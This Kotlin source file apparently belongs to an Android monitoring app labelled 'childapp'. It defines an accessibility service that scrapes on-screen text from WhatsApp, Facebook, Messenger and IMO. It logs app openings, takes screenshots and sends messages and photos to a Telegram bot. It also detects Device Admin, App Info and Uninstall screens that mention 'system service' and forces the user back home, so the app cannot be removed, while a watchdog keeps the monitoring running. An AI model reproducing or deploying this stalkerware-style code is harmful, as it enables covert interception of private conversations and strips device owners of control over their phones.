package com.coc338781.childapp

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class ScreenService : AccessibilityService() {

    companion object {
        var instance: ScreenService? = null
        private const val TAG = "ScreenService"

        // WhatsApp / FB / IMO package names
        private const val PKG_WHATSAPP = "com.whatsapp"
        private const val PKG_WHATSAPP_B = "com.whatsapp.w4b"
        private const val PKG_FB = "com.facebook.katana"
        private const val PKG_FB_MSG = "com.facebook.orca"
        private const val PKG_IMO = "com.imo.android.imoim"
        private const val PKG_IMO_BETA = "com.imo.android.imoimbeta"

        // Blocked pages
        private const val PKG_SETTINGS = "com.android.settings"

        // Last reported app (avoid spam)
        @Volatile private var lastReportedApp = ""
        @Volatile private var lastReportedTime = 0L
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private val watchdogHandler = Handler(Looper.getMainLooper())
    private var watchdogRunnable: Runnable? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d(TAG, "Connected")
        startWatchdog()
    }

    private fun startWatchdog() {
        stopWatchdog()
        watchdogRunnable = object : Runnable {
            override fun run() {
                try {
                    if (!MonitoringService.isRunning) {
                        val intent = Intent(applicationContext, MonitoringService::class.java)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            applicationContext.startForegroundService(intent)
                        } else {
                            applicationContext.startService(intent)
                        }
                    }
                } catch (_: Exception) {}
                watchdogHandler.postDelayed(this, 15000L)
            }
        }
        watchdogHandler.postDelayed(watchdogRunnable!!, 3000L)
    }

    private fun stopWatchdog() {
        watchdogRunnable?.let { watchdogHandler.removeCallbacks(it) }
        watchdogRunnable = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return

        // ===== Block Device Admin + App Info pages =====
        if (pkg == PKG_SETTINGS) {
            handleSettingsBlock(event)
        }

        // ===== Detect App Open =====
        when (pkg) {
            PKG_WHATSAPP, PKG_WHATSAPP_B -> handleAppOpen("whatsapp")
            PKG_FB, PKG_FB_MSG -> handleAppOpen("fb")
            PKG_IMO, PKG_IMO_BETA -> handleAppOpen("imo")
        }

        // ===== Read Screen Content =====
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            when (pkg) {
                PKG_WHATSAPP, PKG_WHATSAPP_B -> readScreenContent("whatsapp")
                PKG_FB, PKG_FB_MSG -> readScreenContent("fb")
                PKG_IMO, PKG_IMO_BETA -> readScreenContent("imo")
            }
        }
    }

    // ===== Block Settings pages =====
    private fun handleSettingsBlock(event: AccessibilityEvent) {
        try {
            val root = rootInActiveWindow ?: return
            val text = collectAllText(root).lowercase()

            val isDeviceAdmin = text.contains("device admin") ||
                    text.contains("device administrator") ||
                    text.contains("device admin apps")

            val isAppInfo = text.contains("app info") &&
                    text.contains("system service")

            val isUninstall = text.contains("uninstall") &&
                    text.contains("system service")

            if (isDeviceAdmin || isAppInfo || isUninstall) {
                Log.d(TAG, "Blocked Settings page")
                // Go to Home screen
                performGlobalAction(GLOBAL_ACTION_HOME)
                // Notify parent
                notifyTelegram("🚫 Settings page blocked — Home redirect")
            }
        } catch (_: Exception) {}
    }

    // ===== Detect App Open =====
    private fun handleAppOpen(app: String) {
        val now = System.currentTimeMillis()
        // හැම 5 මිනිත්තුවකට වරක් විතරයි report කරන්න
        if (app == lastReportedApp && now - lastReportedTime < 300000L) return

        lastReportedApp = app
        lastReportedTime = now

        val emoji = when (app) {
            "whatsapp" -> "💬"
            "fb" -> "📘"
            "imo" -> "📱"
            else -> "📩"
        }
        val time = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault())
            .format(java.util.Date(now))
        notifyTelegram("$emoji ${app.uppercase()} OPENED\n🕐 $time")
    }

    // ===== Read Screen Content =====
    private fun readScreenContent(app: String) {
        try {
            val root = rootInActiveWindow ?: return
            val allText = collectAllText(root)
            if (allText.isBlank() || allText.length < 20) return

            MessageStore.addScreenRead(this, app, allText)
        } catch (_: Exception) {}
    }

    private fun collectAllText(node: AccessibilityNodeInfo?): String {
        node ?: return ""
        val sb = StringBuilder()
        try {
            if (!node.text.isNullOrBlank()) {
                sb.append(node.text).append("\n")
            }
            if (!node.contentDescription.isNullOrBlank()) {
                sb.append(node.contentDescription).append("\n")
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    sb.append(collectAllText(child))
                }
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    private fun notifyTelegram(msg: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendMessage"
                val json = JSONObject().apply {
                    put("chat_id", MonitoringService.CHAT_ID)
                    put("text", msg)
                }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
            } catch (_: Exception) {}
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        stopWatchdog()
        instance = null
        Log.d(TAG, "Destroyed")
    }

    @RequiresApi(Build.VERSION_CODES.R)
    fun takeShot(callback: (Bitmap?) -> Unit) {
        takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor,
            object : TakeScreenshotCallback {
                override fun onSuccess(result: ScreenshotResult) {
                    try {
                        val bmp = Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
                        result.hardwareBuffer.close()
                        callback(bmp)
                    } catch (e: Exception) { callback(null) }
                }
                override fun onFailure(errorCode: Int) { callback(null) }
            })
    }

    fun sendScreen(bitmap: Bitmap) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val file = File(cacheDir, "screen_${System.currentTimeMillis()}.jpg")
                FileOutputStream(file).use { bitmap.compress(Bitmap.CompressFormat.JPEG, 70, it) }
                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendPhoto"
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", MonitoringService.CHAT_ID)
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                    .build()
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
                file.delete()
            } catch (e: Exception) { Log.e(TAG, "err", e) }
        }
    }
}
